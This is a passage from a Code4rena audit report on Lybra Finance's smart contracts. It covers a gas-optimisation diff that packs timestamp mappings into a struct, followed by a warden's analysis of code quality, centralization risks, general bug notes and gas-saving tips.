Combine `time2fullRedemption` and `lastWithdrawTime` into one mapping of a struct and reduce the `uint` type of each variable (this is possible since they hold timestamps). Doing so will allow us to pack the variables into one slot, which will result in avoiding a `Gsset (20000 gas)` when both values are set in a function call and avoiding a `Gcoldsload (2100 gas)` when both values are accessed in a function call.

*The following functions will benefit from this optimization: [`ProtocolRewardsPool.unstake`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L87), [`ProtocolRewardsPool.withdraw`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L100), and [`ProtocolRewardsPool.unlockPrematurely`](https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/miner/ProtocolRewardsPool.sol#L113).*

*Note: The bot race flagged these instances, but failed to explain the refactoring needed to achieve the optimal gas savings. Simply combining the `time2fullRedemption` and `lastWithdrawTime` mappings will not result in any significant gas savings since those values will still occupy their own slot. The explanation offered above and the complementary refactoring below allows us to understand this optimization in its entirety. For these reasons, this finding is included in this report.*
```solidity
File: contracts/lybra/miner/ProtocolRewardsPool.sol
36:    mapping(address => uint) public time2fullRedemption;
37:    mapping(address => uint) public unstakeRatio;
38:    mapping(address => uint) public lastWithdrawTime;
```
```diff
diff --git a/lybra/miner/ProtocolRewardsPool.sol b/lybra/miner/ProtocolRewardsPool.sol
index 8fc83d6..6768fac 100644
--- a/lybra/miner/ProtocolRewardsPool.sol
+++ b/lybra/miner/ProtocolRewardsPool.sol
@@ -33,12 +33,18 @@ contract ProtocolRewardsPool is Ownable {
     mapping(address => uint) public userRewardPerTokenPaid;
     // User address => rewards to be claimed
     mapping(address => uint) public rewards;
-    mapping(address => uint) public time2fullRedemption;
     mapping(address => uint) public unstakeRatio;
-    mapping(address => uint) public lastWithdrawTime;
     uint256 immutable exitCycle = 90 days;
     uint256 public grabableAmount;
     uint256 public grabFeeRatio = 3000;
+
+    struct TimeStruct {
+        uint128 time2fullRedemption;
+        uint128 lastWithdrawTime;
+    }
+
+    mapping(address => TimeStruct) timeStruct;
+
     event Restake(address indexed user, uint256 amount, uint256 time);
     event StakeLBR(address indexed user, uint256 amount, uint256 time);
     event UnstakeLBR(address indexed user, uint256 amount, uint256 time);
@@ -89,11 +95,12 @@ contract ProtocolRewardsPool is Ownable {
         esLBR.burn(msg.sender, amount);
         withdraw(msg.sender);
         uint256 total = amount;
-        if (time2fullRedemption[msg.sender] > block.timestamp) {
-            total += unstakeRatio[msg.sender] * (time2fullRedemption[msg.sender] - block.timestamp);
+        TimeStruct storage _timeStruct = timeStruct[msg.sender];
+        if (_timeStruct.time2fullRedemption > block.timestamp) {
+            total += unstakeRatio[msg.sender] * (_timeStruct.time2fullRedemption - block.timestamp);
         }
         unstakeRatio[msg.sender] = total / exitCycle;
-        time2fullRedemption[msg.sender] = block.timestamp + exitCycle;
+        _timeStruct.time2fullRedemption = uint128(block.timestamp + exitCycle);
         emit UnstakeLBR(msg.sender, amount, block.timestamp);
     }

@@ -102,7 +109,7 @@ contract ProtocolRewardsPool is Ownable {
         if (amount > 0) {
             LBR.mint(user, amount);
         }
-        lastWithdrawTime[user] = block.timestamp;
+        timeStruct[user].lastWithdrawTime = uint128(block.timestamp);
         emit WithdrawLBR(user, amount, block.timestamp);
     }

@@ -111,14 +118,15 @@ contract ProtocolRewardsPool is Ownable {
      * with the lost portion being recorded in the contract and available for others to purchase in LBR at a certain ratio.
      */
     function unlockPrematurely() external {
-        require(block.timestamp + exitCycle - 3 days > time2fullRedemption[msg.sender], "ENW");
+        TimeStruct storage _timeStruct = timeStruct[msg.sender];
+        require(block.timestamp + exitCycle - 3 days > _timeStruct.time2fullRedemption, "ENW");
         uint256 burnAmount = getReservedLBRForVesting(msg.sender) - getPreUnlockableAmount(msg.sender);
         uint256 amount = getPreUnlockableAmount(msg.sender) + getClaimAbleLBR(msg.sender);
         if (amount > 0) {
             LBR.mint(msg.sender, amount);
         }
         unstakeRatio[msg.sender] = 0;
-        time2fullRedemption[msg.sender] = 0;
+        _timeStruct.time2fullRedemption = 0;
         grabableAmount += burnAmount;
     }

@@ -142,25 +150,26 @@ contract ProtocolRewardsPool is Ownable {
         uint256 amount = getReservedLBRForVesting(msg.sender) + getClaimAbleLBR(msg.sender);
         esLBR.mint(msg.sender, amount);
         unstakeRatio[msg.sender] = 0;
-        time2fullRedemption[msg.sender] = 0;
+        timeStruct[msg.sender].time2fullRedemption = 0;
         emit Restake(msg.sender, amount, block.timestamp);
     }

     function getPreUnlockableAmount(address user) public view returns (uint256 amount) {
         uint256 a = getReservedLBRForVesting(user);
         if (a == 0) return 0;
-        amount = (a * (75e18 - ((time2fullRedemption[user] - block.timestamp) * 70e18) / (exitCycle / 1 days - 3) / 1 days)) / 100e18;
+        amount = (a * (75e18 - ((timeStruct[user].time2fullRedemption - block.timestamp) * 70e18) / (exitCycle / 1 days - 3) / 1 days)) / 100e18;
     }

     function getClaimAbleLBR(address user) public view returns (uint256 amount) {
-        if (time2fullRedemption[user] > lastWithdrawTime[user]) {
-            amount = block.timestamp > time2fullRedemption[user] ? unstakeRatio[user] * (time2fullRedemption[user] - lastWithdrawTime[user]) : unstakeRatio[user] * (block.timest
amp - lastWithdrawTime[user]);
+        TimeStruct storage _timeStruct = timeStruct[user];
+        if (_timeStruct.time2fullRedemption > _timeStruct.lastWithdrawTime) {
+            amount = block.timestamp > _timeStruct.time2fullRedemption ? unstakeRatio[user] * (_timeStruct.time2fullRedemption - _timeStruct.lastWithdrawTime) : unstakeRatio[use
r] * (block.timestamp - _timeStruct.lastWithdrawTime);
         }
     }

     function getReservedLBRForVesting(address user) public view returns (uint256 amount) {
-        if (time2fullRedemption[user] > block.timestamp) {
-            amount = unstakeRatio[user] * (time2fullRedemption[user] - block.timestamp);
+        if (timeStruct[user].time2fullRedemption > block.timestamp) {
+            amount = unstakeRatio[user] * (timeStruct[user].time2fullRedemption - block.timestamp);
         }
     }
```

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/898#issuecomment-1656626428)**

***

# Audit Analysis

For this audit, 10 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-06-lybra-findings/issues/666) by **Sathish9098** received the top score from the judge.

*The following wardens also submitted reports: [MrPotatoMagic](https://github.com/code-423n4/2023-06-lybra-findings/issues/948), 
[K42](https://github.com/code-423n4/2023-06-lybra-findings/issues/856), 
[ktg](https://github.com/code-423n4/2023-06-lybra-findings/issues/779), 
[solsaver](https://github.com/code-423n4/2023-06-lybra-findings/issues/714), 
[0xbrett8571](https://github.com/code-423n4/2023-06-lybra-findings/issues/678), 
[hl\_](https://github.com/code-423n4/2023-06-lybra-findings/issues/619), 
[ABAIKUNANBAEV](https://github.com/code-423n4/2023-06-lybra-findings/issues/613), 
[0x3b](https://github.com/code-423n4/2023-06-lybra-findings/issues/444), and
[peanuts](https://github.com/code-423n4/2023-06-lybra-findings/issues/425).*

## Lybra Finance - Analysis 

|Heading |Details|
|:----------------|:------|
| Approach taken in evaluating the codebase | What is unique? How are the existing patterns used? |
|Codebase quality analysis| Its structure, readability, maintainability, and adherence to best practices|
|Centralization risks| Power, control, or decision-making authority is concentrated in a single entity|
|Bug Fix|Process of identifying and resolving issues or errors|
|Gas Optimization|Process of reducing the amount of gas consumed by a smart contract or transaction on a blockchain network|
|Other recommendations| Recommendations for improving the quality of your codebase|
|Time spent on analysis | Time detail of individual stages in my code review and analysis |

## Approach taken in evaluating the codebase

Steps:

- `Use a static code analysis tool`: Static code analysis tools can scan the code for potential bugs and vulnerabilities. These tools can be used to identify a wide range of issues, including:

    - Insecure coding practices
    - Common vulnerabilities
    - Code that is not compliant with security standards

- `Read the documentation`: The documentation for Lybra Finance should provide a detailed overview of the protocol and its codebase. This documentation can be used to understand the purpose of the code and to identify potential areas of concern.

- `Scope the analysis`: Once you have a basic understanding of the protocol and its codebase, you can start to scope the analysis. This involves identifying the specific areas of code that you want to focus on. For example, you may want to focus on the code that handles user input, the code that interacts with external APIs, or the code that stores sensitive data.

- `Manually review the code`: Once you have scoped the analysis, you can start to manually review the code. This involves reading the code line-by-line and looking for potential problems. Some of the things you should look for include:

   - Unvalidated user input
   - Hardcoded credentials
   - Insecure cryptographic functions
   - Unsafe deserialization

- `Mark vulnerable code parts with @audit tags`: Once you have identified any potential vulnerabilities, you should mark them with @audit tags. This will help you to identify the vulnerable code parts later on.

- `Dig deep into vulnerable code parts and compare with documentations`:  For each vulnerable code part, you should dig deep to understand how it works and why it is vulnerable. You should also compare the code with the documentation to see if there are any discrepancies.

- `Perform a series of tests`: Once you have finished reviewing the code, you should perform a series of tests to ensure that it works as intended. These tests should cover a wide range of scenarios, including:

  - Valid and invalid user input
  - Different types of attacks
  - Different operating systems and hardware platforms

- `Report any problems`:  If you find any problems with the code, you should report them to the developers of Lybra Finance. The developers will then be able to fix the problems and release a new version of the protocol.

## Codebase quality analysis

### `LybraPeUSDVaultBase.sol`

- The contract does not have explicit access control modifiers, such as `onlyOwner` or `onlyAuthorized`, to restrict access to sensitive functions.
- The contract lacks comprehensive error handling mechanisms. It does not provide explicit error messages or revert reasons in many cases.
- The contract lacks detailed inline comments explaining the purpose and functionality of the code.

### `LybraEUSDVaultBase.sol`

- The contract lacks sufficient comments to explain the purpose and functionality of the code.
- The contract uses a mix of different naming conventions for variables, functions, and events.
- Some functions and variables have no access modifiers specified, such as `totalDepositedAsset`, `lastReportTime`, and `poolTotalEUSDCirculation` (e.g., public, external, internal, private).
- There are some missing or inadequate error handling mechanisms in the contract. For example, the require statements do not provide specific error messages, which could make it challenging to diagnose issues when a transaction fails.
- The contract's event names, such as `LiquidationRecord` and `LSDValueCaptured`, do not follow the typical event naming conventions.
- Some variables, such as `vaultType`, `feeStored`, and `lastReportTime`, are declared, but not used in the contract. Removing these unused variables would enhance code clarity and reduce unnecessary storage costs.
- There is some code duplication in functions like `liquidation` and `superLiquidation`. Duplicated code increases the risk of errors and makes the contract harder to maintain.

### `EUSDMiningIncentives.sol`

-  Instead of initializing the `configurator` and `esLBRBoost` variables in the constructor, consider using constructor initialization syntax. This can improve readability and reduce the number of function calls needed during deployment.
- Add input validation checks to functions that require specific conditions to be met. For example, in the `setBiddingCost` function, ensure that the `_biddingRatio` parameter is within the allowed range.
- When calculating the `stakedOf` function, consider optimizing the loop by using a for loop with a fixed length instead of a dynamic for loop. This can improve gas efficiency.
- Explicitly specify the visibility modifiers for all functions, including external and internal functions.
- Consider using enumerations to represent different states or types within the contract.
- Look for opportunities to refactor repetitive code sections into reusable functions or modifiers. For example, the reward calculation logic in the earned function can be extracted into a separate internal function to improve code readability and maintainability.
-  Implement appropriate error handling mechanisms, such as reverting transactions with informative error messages when specific conditions are not met.

### `LybraConfigurator.sol`

- Consider adding visibility specifiers like public, external, or internal to functions and state variables; `vaultBadCollateralRatio,vaultSafeCollateralRatio,redemptionProvider` don't have any visibility.
- In the `setBadCollateralRatio` function, you can add additional checks to validate the `newRatio` value.
- You can combine similar mapping variables like `vaultMintPaused` and `vaultBurnPaused` into a single mapping that stores a struct with both flags.

### `ProtocolRewardsPool.sol `

- The contract lacks sufficient inline comments to explain the purpose and functionality of the code.
- Some functions, such as `getPreUnlockableAmount` and `getReservedLBRForVesting`, contain complex calculations and lack clear explanations or documentation.
- Ensuring consistent naming throughout the contract improves code readability and maintainability.
- The contract combines various functionalities, such as staking, claiming rewards, and conversion between different tokens, in a single contract. Breaking down the contract into smaller, modular components can enhance code organization and reusability.
- The contract does not provide detailed error messages in some cases, making it challenging to identify the root cause of failures or exceptions.

### `PeUSDMainnetStableVision.sol`

- The contract does not perform sufficient input validation for certain parameters, such as the `eusdAmount` in the `convertToPeUSD` function.
- The code uses require statements to check conditions and revert transactions when the conditions are not met. However, the error messages provided in the require statements are not descriptive.
- The contract's constructor initializes several variables and requires the input of `_config`, `_sharedDecimals`, and `_lzEndpoint`. It is crucial to ensure that these parameters are correctly set during contract deployment.

## Centralization risks

A single point of failure is not acceptable for this project. Centrality risk is high in the project as the role of `onlyOwner` detailed below has very critical and important powers:

Project and funds may be compromised by a malicious or stolen private key `onlyOwner` `msg.sender`

```solidity
FILE: 2023-06-lybra/contracts/lybra/miner/EUSDMiningIncentives.sol

84: function setToken(address _lbr, address _eslbr) external onlyOwner {
89: function setLBROracle(address _lbrOracle) external onlyOwner {
93: function setPools(address[] memory _pools) external onlyOwner {
100:function setBiddingCost(uint256 _biddingRatio) external onlyOwner {
105:function setExtraRatio(uint256 ratio) external onlyOwner {
110: function setPeUSDExtraRatio(uint256 ratio) external onlyOwner {
115: function setBoost(address _boost) external onlyOwner {
119: function setRewardsDuration(uint256 _duration) external onlyOwner {
124: function setEthlbrStakeInfo(address _pool, address _lp) external onlyOwner {
128: function setEUSDBuyoutAllowed(bool _bool) external onlyOwner {


FILE: 2023-06-lybra/contracts/lybra/miner/ProtocolRewardsPool.sol

52:  function setTokenAddress(address _eslbr, address _lbr, address _boost) external onlyOwner {
58:  function setGrabCost(uint256 _ratio) external onlyOwner {

FILE: Breadcrumbs2023-06-lybra/contracts/lybra/miner/stakerewardV2pool.sol

121: function setRewardsDuration(uint256 _duration) external onlyOwner {
127: function setBoost(address _boost) external onlyOwner {
132: function notifyRewardAmount(uint256 _amount) external onlyOwner updateReward(address(0)) {

```

## Bug Fix

1. ` Does it use a timelock function?:  True` - timeclock functions not implemented as per documentations.

2. Potential reentrancy vulnerability in the code includes external contract calls, such as `EUSD.transfer` and `peUSD.transfer`. If these contracts are not implemented securely and follow the `checks-effects-interactions` pattern, there may be a risk of reentrancy attacks.

3.  `deposit` and `withdraw`, are not properly checked for potential integer overflow or underflow. 

4. Should disable the `renownceOwnerhip()` whenever we use `Ownable`. Its possible `onlyOwner` can `renounceOwner` in an unexpected way. So contracts can be in deep trouble without `owner`. 

5. The `withdraw` function allows the sender to specify an `arbitrary address` to send the funds. This design could be vulnerable to `denial-of-service` scenario by consuming excessive gas during the withdrawal process.

6. Consider adding `event` logging to important contract functions, such as `deposit and withdraw` for important state changes.

7. The `setBiddingCost` function should include a check to ensure that the ` _biddingRatio` is within a valid range. 

8. The contract includes some external function calls (e.g., `EUSD.transferFrom` and `configurator.distributeRewards`), but it does not handle potential exceptions that could arise from these calls.

9. Some state variables, such as `redemptionFee`, `flashloanFee`, and `maxStableRatio`, are directly modifiable by privileged roles without any additional checks or restrictions.

10. The code does not include mechanisms to prevent or mitigate DoS attacks, such as gas limit restrictions, rate limiting, or circuit breakers. Malicious actors could potentially exploit vulnerable areas in the code to consume excessive gas, leading to DoS attacks.

11. In the `notifyRewardAmount` function, when calculating the `rewardPerTokenStored`, there could be precision loss when performing division operations. The code should handle the decimal places appropriately and ensure that precision loss does not occur, especially when dealing with token amounts or ratios.

## Gas Optimization

- Some calculations, especially in the `getPreUnlockableAmount` function, involve multiple operations that may consume a significant amount of gas. Optimizing these calculations can improve the contract's gas efficiency and reduce transaction costs.

- `Review data types`: Analyze the data types used in your smart contracts and consider if they can be further optimized. For example, changing `uint256` to `uint128` or `uint94` can save gas and storage slots.

- `Struct packing`: Look for opportunities to pack structs into fewer storage slots. By carefully selecting appropriate data types for struct members, you can reduce the overall storage usage.

- `Use constant values`: If certain values in your contracts are constant and do not change, declare them as constants rather than storing them as state variables. This can significantly save gas costs.

- `Avoid unnecessary storage`: Examine your code and eliminate any unnecessary storage of variables or addresses that are not required for contract functionality.

- `Storage vs. memory usage`: When working with arrays or structs, consider whether using storage instead of memory can save gas. Using storage allows direct access to the state variables and avoids unnecessary copying of data.

- Replacing the use of `memory` with `calldata` for read-only arguments in `external functions`.

## Other recommendations

- Regular code reviews and adherence to best practices.
- Conduct external audits by security experts.
- Consider open sourcing the contract for community review.
- Maintain comprehensive security documentation.
- Establish a responsible disclosure policy for vulnerabilities.
- Implement continuous monitoring for unusual activity.
- Educate users about risks and best practices.

## Time spent on analysis 

15 Hours

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/666#issuecomment-1653164225)**

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
